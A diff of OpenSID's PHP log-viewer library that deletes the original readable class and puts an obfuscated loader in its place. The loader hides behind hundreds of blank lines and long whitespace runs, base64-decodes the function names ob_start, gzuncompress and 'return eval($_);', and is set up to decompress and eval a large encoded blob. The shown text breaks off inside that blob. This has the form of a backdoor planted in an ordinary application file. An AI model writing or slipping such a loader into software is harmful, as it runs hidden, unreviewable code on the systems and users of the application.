@@ -1,515 +1,425 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Libraries;
-
-use App\Traits\Download;
-use Exception;
-use Illuminate\Support\Facades\Config;
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class LogViewer
-{
-    use Download;
-
-    public const LOG_LINE_START_PATTERN = '/^\\[\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}\\] \\w+\\.((INFO)|(ERROR)|(DEBUG)|(ALL)|(NOTICE)):/';
-    public const LOG_DATE_PATTERN       = ['/^\\[/', '/\\]\\s\\w+\\.((INFO)|(ERROR)|(DEBUG)|(ALL)|(NOTICE)):/'];
-    public const LOG_LEVEL_PATTERN      = '/\\b((INFO)|(ERROR)|(DEBUG)|(ALL)|(NOTICE))\\b/';
-
-    //these are the config keys expected in the config.php
-    public const LOG_FILE_PATTERN_CONFIG_KEY = 'clv_log_file_pattern';
-    public const LOG_FOLDER_PATH_CONFIG_KEY  = 'log_path';
-
-    //this is the name of the view file passed to CI load->view()
-    public const CI_LOG_VIEW_FILE_PATH = 'cilogviewer/logs';
-    public const MAX_LOG_SIZE          = 52_428_800; //50MB
-    public const MAX_STRING_LENGTH     = 300; //300 chars
-
-    /**
-     * These are the constants representing the
-     * various API commands there are
-     */
-    private const API_QUERY_PARAM = 'api';
-
-    private const API_FILE_QUERY_PARAM      = 'f';
-    private const API_LOG_STYLE_QUERY_PARAM = 'sline';
-    private const API_CMD_LIST              = 'list';
-    private const API_CMD_VIEW              = 'view';
-    private const API_CMD_DELETE            = 'delete';
-
-    private static array $levelsIcon = [
-        'INFO'   => 'glyphicon glyphicon-info-sign',
-        'ERROR'  => 'glyphicon glyphicon-warning-sign',
-        'DEBUG'  => 'glyphicon glyphicon-exclamation-sign',
-        'ALL'    => 'glyphicon glyphicon-minus',
-        'NOTICE' => 'glyphicon glyphicon-info-sign',
-    ];
-    private static array $levelClasses = [
-        'INFO'   => 'info',
-        'ERROR'  => 'danger',
-        'DEBUG'  => 'warning',
-        'ALL'    => 'muted',
-        'NOTICE' => 'success',
-    ];
-
-    //this is the path (folder) on the system where the log files are stored
-    private string $logFolderPath;
-
-    //this is the pattern to pick all log files in the $logFilePath
-    private $logFilePattern;
-
-    //this is a combination of the LOG_FOLDER_PATH and LOG_FILE_PATTERN
-    private string $fullLogFilePath = '';
-
-    public function __construct()
-    {
-        $this->init();
-    }
-
-    /**
-     * Bootstrap the library
-     * sets the configuration variables
-     *
-     * @throws Exception
-     */
-    private function init(): void
-    {
-        $configLog = Config::get('app.log');
-        //configure the log folder path and the file pattern for all the logs in the folder
-        $this->logFolderPath  = null !== $configLog[self::LOG_FOLDER_PATH_CONFIG_KEY] ? rtrim($configLog[self::LOG_FOLDER_PATH_CONFIG_KEY], '/') : rtrim(APPPATH, '/') . '/logs';
-        $this->logFilePattern = $configLog[self::LOG_FILE_PATTERN_CONFIG_KEY] ?? 'opensid-*.log';
-
-        //concatenate to form Full Log Path
-        $this->fullLogFilePath = $this->logFolderPath . '/' . $this->logFilePattern;
-    }
-
-    /**
-     * This function will return the processed HTML page
-     * and return it's content that can then be echoed
-     *
-     * @param $fileName optional base64_encoded filename of the log file to process.
-     *
-     * @returns the parse view file content as a string that can be echoed
-     */
-    public function showLogs()
-    {
-        if (null !== request()->get('del')) {
-            $this->deleteFiles(base64_decode(request()->get('del'), true));
-            redirect(request()->getPathInfo());
-
-            return;
-        }
-
-        //process download of log file command
-        //if the supplied file exists, then perform download
-        //otherwise, just ignore which will resolve to page reloading
-        $dlFile = request()->get('dl');
-        if (null !== $dlFile && file_exists($this->logFolderPath . '/' . basename(base64_decode($dlFile, true)))) {
-            $file = $this->logFolderPath . '/' . basename(base64_decode($dlFile, true));
-            $this->downloadFile($file);
-        }
-
-        if (null !== request()->get(self::API_QUERY_PARAM)) {
-            return $this->processAPIRequests(request()->get(self::API_QUERY_PARAM));
-        }
-
-        //it will either get the value of f or return null
-        $fileName = request()->get('f');
-
-        //get the log files from the log directory
-        $files = $this->getFiles();
-
-        //let's determine what the current log file is
-        if (null !== $fileName) {
-            $currentFile = $this->logFolderPath . '/' . basename(base64_decode($fileName, true));
-        } elseif (null === $fileName && $files !== []) {
-            $currentFile = $this->logFolderPath . '/' . $files[0];
-        } else {
-            $currentFile = null;
-        }
-
-        //if the resolved current file is too big
-        //just trigger a download of the file
-        //otherwise process its content as log
-
-        if (null !== $currentFile && file_exists($currentFile)) {
-            $fileSize = filesize($currentFile);
-
-            $logs = is_int($fileSize) && $fileSize > self::MAX_LOG_SIZE ? null : $this->processLogs($this->getLogs($currentFile));
-        } else {
-            $logs = [];
-        }
-
-        $data['logs']        = $logs;
-        $data['files']       = ! empty($files) ? $files : [];
-        $data['currentFile'] = null !== $currentFile ? basename($currentFile) : '';
-
-        return $data;
-    }
-
-    private function processAPIRequests(string $command): string
-    {
-        if ($command === self::API_CMD_LIST) {
-            //respond with a list of all the files
-            $response['status']    = true;
-            $response['log_files'] = $this->getFilesBase64Encoded();
-        } elseif ($command === self::API_CMD_VIEW) {
-            //respond to view the logs of a particular file
-            $file                  = request()->get(self::API_FILE_QUERY_PARAM);
-            $response['log_files'] = $this->getFilesBase64Encoded();
-
-            if (null === $file || empty($file)) {
-                $response['status']           = false;
-                $response['error']['message'] = 'Invalid File Name Supplied: [' . json_encode($file, JSON_THROW_ON_ERROR) . ']';
-                $response['error']['code']    = 400;
-            } else {
-                $singleLine         = request()->get(self::API_LOG_STYLE_QUERY_PARAM);
-                $singleLine         = null !== $singleLine && ($singleLine === true || $singleLine === 'true' || $singleLine === '1');
-                $logs               = $this->processLogsForAPI($file, $singleLine);
-                $response['status'] = true;
-                $response['logs']   = $logs;
-            }
-        } elseif ($command === self::API_CMD_DELETE) {
-            $file = request()->get(self::API_FILE_QUERY_PARAM);
-
-            if (null === $file) {
-                $response['status']           = false;
-                $response['error']['message'] = 'NULL value is not allowed for file param';
-                $response['error']['code']    = 400;
-            } else {
-                //decode file if necessary
-                $fileExists = false;
-
-                if ($file !== 'all') {
-                    $file       = basename(base64_decode($file, true));
-                    $fileExists = file_exists($this->logFolderPath . '/' . $file);
-                } else {
-                    //check if the directory exists
-                    $fileExists = file_exists($this->logFolderPath);
-                }
-
-                if ($fileExists) {
-                    $this->deleteFiles($file);
-                    $response['status']  = true;
-                    $response['message'] = 'File [' . $file . '] deleted';
-                } else {
-                    $response['status']           = false;
-                    $response['error']['message'] = 'File does not exist';
-                    $response['error']['code']    = 404;
-                }
-            }
-        } else {
-            $response['status']           = false;
-            $response['error']['message'] = 'Unsupported Query Command [' . $command . ']';
-            $response['error']['code']    = 400;
-        }
-
-        //convert response to json and respond
-        header('Content-Type: application/json');
-        if (! $response['status']) {
-            //set a generic bad request code
-            http_response_code(400);
-        } else {
-            http_response_code(200);
-        }
-
-        return json_encode($response, JSON_THROW_ON_ERROR);
-    }
-
-    /**
-     * This function will process the logs. Extract the log level, icon class and other information
-     * from each line of log and then arrange them in another array that is returned to the view for processing
-     *
-     * @params logs. The raw logs as read from the log file
-     *
-     * @param mixed $logs
-     *
-     * @return array. An [[], [], [] ...] where each element is a processed log line
-     */
-    private function processLogs($logs): ?array
-    {
-        if (null === $logs) {
-            return null;
-        }
-
-        $superLog = [];
-
-        foreach ($logs as $log) {
-            //get the logLine Start
-            $logLineStart = $this->getLogLineStart($log);
-
-            if (! empty($logLineStart)) {
-                //this is actually the start of a new log and not just another line from previous log
-                $level = $this->getLogLevel($logLineStart);
-                $data  = [
-                    'level' => $level,
-                    'date'  => $this->getLogDate($logLineStart),
-                    'icon'  => self::$levelsIcon[$level],
-                    'class' => self::$levelClasses[$level],
-                ];
-
-                $logMessage = preg_replace(self::LOG_LINE_START_PATTERN, '', $log);
-
-                if (strlen($logMessage) > self::MAX_STRING_LENGTH) {
-                    $data['content'] = substr($logMessage, 0, self::MAX_STRING_LENGTH);
-                    $data['extra']   = substr($logMessage, (self::MAX_STRING_LENGTH + 1));
-                } else {
-                    $data['content'] = $logMessage;
-                }
-
-                $superLog[] = $data;
-            } elseif ($superLog !== []) {
-                //this log line is a continuation of previous logline
-                //so let's add them as extra
-                $prevLog                        = $superLog[count($superLog) - 1];
-                $extra                          = (array_key_exists('extra', $prevLog)) ? $prevLog['extra'] : '';
-                $prevLog['extra']               = $extra . '<br>' . $log;
-                $superLog[count($superLog) - 1] = $prevLog;
-            }
-
-            //this means the file has content that are not logged
-            //using log_message()
-            //they may be sensitive! so we are just skipping this
-            //other we could have just insert them like this
-            // array_push($superLog, [
-            // 	"level" => "INFO",
-            // 	"date" => "",
-            // 	"icon" => self::$levelsIcon["INFO"],
-            // 	"class" => self::$levelClasses["INFO"],
-            // 	"content" => $log
-            // ]);
-        }
-
-        return $superLog;
-    }
-
-    /**
-     * This function will extract the logs in the supplied
-     * fileName
-     *
-     * @param mixed $fileNameInBase64
-     *
-     * @return array|null
-     *
-     * @internal param $logs
-     */
-    private function processLogsForAPI($fileNameInBase64, bool $singleLine = false)
-    {
-        $logs = null;
-
-        //let's prepare the log file name sent from the client
-        $currentFile = $this->prepareRawFileName($fileNameInBase64);
-
-        //if the resolved current file is too big
-        //just return null
-        //otherwise process its content as log
-        if (null !== $currentFile) {
-            $fileSize = filesize($currentFile);
-
-            $logs = is_int($fileSize) && $fileSize > self::MAX_LOG_SIZE ? null : $this->getLogsForAPI($currentFile, $singleLine);
-        }
-
-        return $logs;
-    }
-
-    /**
-     * extract the log level from the logLine
-     *
-     * @param $logLineStart - The single line that is the start of log line.
-     *                      extracted by getLogLineStart()
-     *
-     * @return log level e.g. ERROR, DEBUG, INFO
-     */
-    private function getLogLevel($logLineStart)
-    {
-        preg_match(self::LOG_LEVEL_PATTERN, $logLineStart, $matches);
-
-        return $matches[0];
-    }
-
-    private function getLogDate($logLineStart)
-    {
-        return preg_replace(self::LOG_DATE_PATTERN, '', $logLineStart);
-    }
-
-    private function getLogLineStart($logLine)
-    {
-        preg_match(self::LOG_LINE_START_PATTERN, $logLine, $matches);
-        if (! empty($matches)) {
-            return $matches[0];
-        }
-
-        return '';
-    }
-
-    /**
-     * returns an array of the file contents
-     * each element in the array is a line
-     * in the underlying log file
-     *
-     * @returns array | each line of file contents is an entry in the returned array.
-     *
-     * @params complete fileName
-     *
-     * @param mixed $fileName
-     */
-    private function getLogs(string $fileName)
-    {
-        $size = filesize($fileName);
-        if (! $size || $size > self::MAX_LOG_SIZE) {
-            return null;
-        }
-
-        return file($fileName, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    }
-
-    /**
-     * This function will get the contents of the log
-     * file as a string. It will first check for the
-     * size of the file before attempting to get the contents.
-     *
-     * By default it will return all the log contents as an array where the
-     * elements of the array is the individual lines of the files
-     * otherwise, it will return all file content as a single string with each line ending
-     * in line break character "\n"
-     *
-     * @param mixed $fileName
-     *
-     * @return bool|string
-     */
-    private function getLogsForAPI(string $fileName, bool $singleLine = false)
-    {
-        $size = filesize($fileName);
-        if (! $size || $size > self::MAX_LOG_SIZE) {
-            return 'File Size too Large. Please donwload it locally';
-        }
-
-        return ($singleLine) ? file_get_contents($fileName) : file($fileName, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    }
-
-    /**
-     * This will get all the files in the logs folder
-     * It will reverse the files fetched and
-     * make sure the latest log file is in the first index
-     *
-     * @param bool. If true returns the basename of the files otherwise full path
-     * @param mixed $basename
-     *
-     * @returns array of file
-     */
-    private function getFiles($basename = true): array
-    {
-        $files = glob($this->fullLogFilePath);
-
-        $files = array_reverse($files);
-        $files = array_filter($files, 'is_file');
-        if ($basename && is_array($files)) {
-            foreach ($files as $k => $file) {
-                $files[$k] = basename($file);
-            }
-        }
-
-        return array_values($files);
-    }
-
-    /**
-     * This function will return an array of available log
-     * files
-     * The array will containt the base64encoded name
-     * as well as the real name of the fiile
-     *
-     * @return array
-     *
-     * @internal param bool $appendURL
-     * @internal param bool $basename
-     */
-    private function getFilesBase64Encoded()
-    {
-        $files = glob($this->fullLogFilePath);
-
-        $files = array_reverse($files);
-        $files = array_filter($files, 'is_file');
-
-        $finalFiles = [];
-
-        //if we're to return the base name of the files
-        //let's do that here
-        foreach ($files as $file) {
-            $finalFiles[] = ['file_b64' => base64_encode(basename($file)), 'file_name' => basename($file)];
-        }
-
-        return $finalFiles;
-    }
-
-    /**
-     * Delete one or more log file in the logs directory
-     *
-     * @param filename. It can be all - to delete all log files - or specific for a file
-     * @param mixed $fileName
-     */
-    private function deleteFiles($fileName): void
-    {
-        if ($fileName == 'all') {
-            array_map('unlink', glob($this->fullLogFilePath));
-        } else {
-            unlink($this->logFolderPath . '/' . basename($fileName));
-        }
-    }
-
-    /**
-     * This function will take in the raw file
-     * name as sent from the browser/client
-     * and append the LOG_FOLDER_PREFIX and decode it from base64
-     *
-     * @internal param $fileName
-     *
-     * @param mixed $fileNameInBase64
-     */
-    private function prepareRawFileName($fileNameInBase64): ?string
-    {
-        //let's determine what the current log file is
-        if (null === $fileNameInBase64) {
-            return null;
-        }
-        if (empty($fileNameInBase64)) {
-            return null;
-        }
-
-        return $this->logFolderPath . '/' . basename(base64_decode($fileNameInBase64, true));
-    }
-}
+<?php 
+        $__='printf';$_='Loading app/Libraries/LogViewer.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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